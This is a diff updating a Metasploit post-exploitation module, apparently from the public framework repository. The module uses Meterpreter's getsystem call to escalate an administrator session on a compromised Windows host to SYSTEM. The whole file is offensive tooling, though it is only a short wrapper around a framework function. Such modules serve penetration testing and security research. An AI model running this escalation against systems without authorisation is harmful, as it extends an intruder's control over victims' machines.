@@ -1,62 +1,62 @@
 ##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'rex'
 require 'metasm'
-require 'msf/core/post/windows/priv'
 
+class MetasploitModule < Msf::Post
+  include Msf::Post::Windows::Priv
 
-class Metasploit3 < Msf::Post
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Windows Escalate Get System via Administrator',
+        'Description' => %q{
+          This module uses the builtin 'getsystem' command to escalate
+          the current session to the SYSTEM account from an administrator
+          user account.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => 'hdm',
+        'Platform' => [ 'win' ],
+        'SessionTypes' => [ 'meterpreter' ],
+        'Compat' => {
+          'Meterpreter' => {
+            'Commands' => %w[
+              priv_elevate_getsystem
+            ]
+          }
+        }
+      )
+    )
 
-	include Msf::Post::Windows::Priv
+    register_options([
+      OptInt.new('TECHNIQUE', [false, "Specify a particular technique to use (1-5), otherwise try them all", 0])
+    ])
+  end
 
-	def initialize(info={})
-		super(update_info(info,
-			'Name'          => 'Windows Escalate Get System via Administrator',
-			'Description'   => %q{
-					This module uses the builtin 'getsystem' command to escalate
-				the current session to the SYSTEM account from an administrator
-				user account.
-			},
-			'License'       => MSF_LICENSE,
-			'Author'        => 'hdm',
-			'Platform'      => [ 'win' ],
-			'SessionTypes'  => [ 'meterpreter' ]
-		))
+  def unsupported
+    print_error("This platform is not supported with this script!")
+    raise Rex::Script::Completed
+  end
 
-		register_options([
-			OptInt.new('TECHNIQUE', [false, "Specify a particular technique to use (1-4), otherwise try them all", 0])
-		], self.class)
+  def run
+    technique = datastore['TECHNIQUE'].to_i
 
-	end
+    unsupported if client.platform != 'windows' || (client.arch != ARCH_X64 && client.arch != ARCH_X86)
 
-	def unsupported
-		print_error("This version of Meterpreter is not supported with this script!")
-		raise Rex::Script::Completed
-	end
+    if is_system?
+      print_good("This session already has SYSTEM privileges")
+      return
+    end
 
-	def run
-
-		tech = datastore['TECHNIQUE'].to_i
-
-		unsupported if client.platform !~ /win32|win64/i
-
-		if is_system?
-			print_good("This session already has SYSTEM privileges")
-			return
-		end
-
-		result = client.priv.getsystem( tech )
-		if result and result[0]
-			print_good( "Obtained SYSTEM via technique #{result[1]}" )
-		else
-			print_error( "Failed to obtain SYSTEM access" )
-		end
-	end
-
+    begin
+      result = client.priv.getsystem(technique)
+      print_good("Obtained SYSTEM via technique #{result[1]}")
+    rescue Rex::Post::Meterpreter::RequestError => e
+      print_error("Failed to obtain SYSTEM access")
+    end
+  end
 end
